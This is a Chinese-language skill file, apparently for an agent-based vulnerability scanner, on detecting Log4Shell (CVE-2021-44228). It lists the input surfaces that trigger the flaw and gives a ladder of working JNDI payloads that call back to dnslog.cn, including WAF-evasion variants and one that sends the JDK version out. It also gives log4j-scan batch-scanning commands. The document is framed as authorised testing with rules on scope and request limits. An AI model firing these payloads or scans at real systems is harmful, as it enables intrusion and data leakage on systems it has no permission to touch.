---
name: framework-log4j2
description: Log4Shell 专项：触发面清单（任何入 log 的 Header/表单/JSON 字段）、payload 阶梯（基础→lower/::-j 嵌套绕过）、dnslog 回连判定、JDK 8u191 分界、fullhunt/log4j-scan 参数化用法与误报排除
whenToUse: Java 资产批量过 Log4Shell；巡检存量系统、WAF 环境验证绕过变体时
role: vuln-scan
enabled: true
---

# Log4j2 框架专项（Log4Shell CVE-2021-44228）

## 触发面清单（凡是进日志的输入都可能命中）

| 位置 | 命中场景 |
|---|---|
| HTTP Header | User-Agent、Referer、X-Forwarded-For、X-Api-Version、X-Requested-With、Authorization、Accept-Language |
| 表单/GET 参数 | 搜索框、登录名、验证码参数——用户输入常被 `log.info()` 记录 |
| JSON 字段 | 请求体任意嵌套字段（注册、下单、回调参数） |
| 路径 | `/xxx/${jndi:...}/` 访问日志型触发（Tomcat access log 用 log4j 时） |
| 二阶 | 写入 DB 的字段被后台管理系统查询时再入日志（慢触发，巡检时可不管） |

## Payload 阶梯（从基础到绕过）

| 层级 | Payload | 用途 |
|---|---|---|
| L1 基线 | `${jndi:ldap://<id>.dnslog.cn/a}` | 标准探测 |
| L2 lookup 拆分 | `${${lower:j}ndi:${lower:l}dap://<id>.dnslog.cn/a}` | 绕对 `jndi:`/`ldap` 的字符串黑名单 |
| L3 默认值技巧 | `${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://<id>.dnslog.cn/a}` | 完全打碎关键字 |
| L4 env 兜底 | `${${env:FOO:-j}ndi${env:FOO:-:}${env:FOO:-l}dap://<id>.dnslog.cn/a}` | 变体，字符重组 |
| L5 信息回带 | `${jndi:ldap://${sys:java.version}.<id>.dnslog.cn/}` | 带回 JDK 版本，直接决定利用可行性 |

`lower`/`upper` 是 lookup 函数，`${::-x}` 是无 key 的默认值语法——两者都在解析阶段完成，WAF 在字符串层匹配必然漏检其一。

## 回连判定与利用条件

- **判定唯一标准：dnslog/自建 DNS 收到查询**。HTTP 回显 49、页面回显 payload 原文都**不算**命中。
- 带 L5 可直接读到目标 JDK 版本与路径段。

| 条件 | 影响 |
|---|---|
| log4j-core 2.0-beta9 ~ 2.14.1 | CVE-2021-44228 成立；2.15.0 仍有 CVE-2021-45046（用本技能 L2/L4 验证） |
| JDK ≤ 6u211 / 7u201 / 8u191 | LDAP 可加载远程 class → 可到 RCE |
| JDK 高于上述（含 11+） | 远程 codebase 关闭，dnslog 命中即为上限（信息泄露+出网证明），除非目标本地有可组合 gadget |
| 深层修复（formatMsgNoLookups / 2.17.0） | 无回连，结束 |

## fullhunt/log4j-scan 参数化用法

```bash
git clone https://github.com/fullhunt/log4j-scan && cd log4j-scan
pip3 install -r requirements.txt

# 单 URL 全量测试（GET+POST form+POST JSON，60+ Header 逐个 fuzz）
python3 log4j-scan.py -u "https://$TARGET/api/search" --run-all-tests

# WAF 环境加绕过 payload 集
python3 log4j-scan.py -u "https://$TARGET" --waf-bypass

# URL 列表批量巡检（SRC 资产池）
python3 log4j-scan.py -l urls.txt --disable-http-redirects

# 2.15.0 补丁绕过（CVE-2021-45046）检测
python3 log4j-scan.py -u "https://$TARGET" --test-CVE-2021-45046

# 用自建 DNS 回连（可区分客户资产，避免第三方 dnslog 流量出格）
python3 log4j-scan.py -u "https://$TARGET" --custom-dns-callback-host "dns.$MYDOMAIN"
# 弱 UA 校验的站点（自研风控拦 UA）：--exclude-user-agent-fuzzing
```

批量纪律：`--wait-time` 默认 5s 给 DNS 留时间；列表扫描不要对单站并发压测，控制 RPS。

## 误报排除

| 现象 | 结论 |
|---|---|
| 页面回显 `${jndi:...}` 原文、无 DNS 回连 | 只是反射，log4j 未解析 → 误报 |
| WAF 拦截了 payload（回连没发出去） | 无法证伪，换 L2-L4 变体再判 |
| dnslog 命中但目标 JDK>8u191 | 定性为"可出网"而非 RCE，报告降级 |
| 多次无回连但日志系统走异步/外发 | 换 Header 面（Referer）+ 延长观察窗口后再定论 |

## 纪律

- 仅授权范围内扫描；巡检优先 L1/L2 探测级 payload，禁止对生产直接发 TemplatesImpl 类可执行载荷。
- 证据脱敏：报告以"目标→回连时间戳→JDK 版本段"呈现，VPS 与 DNS 域打码。
- 不破坏目标：禁用 `${jndi:ldap://${hostName}.x/...}` 触发内网批量解析风暴；单目标探测 ≤ 20 请求。

## 产出约定

- 记录：触发面（哪个 Header/字段）、payload 层级、回连时间戳、JDK 分界结论（可 RCE / 仅出网）。
- 回填 `redteam_poc_add`：category=log4j2（区分 log4shell-rce / log4shell-oob），language=http，usage 写明 scan 命令与判定证据。

<!-- 改编自: fullhunt/log4j-scan, zhzyker/exphub, 2026-10-31 -->
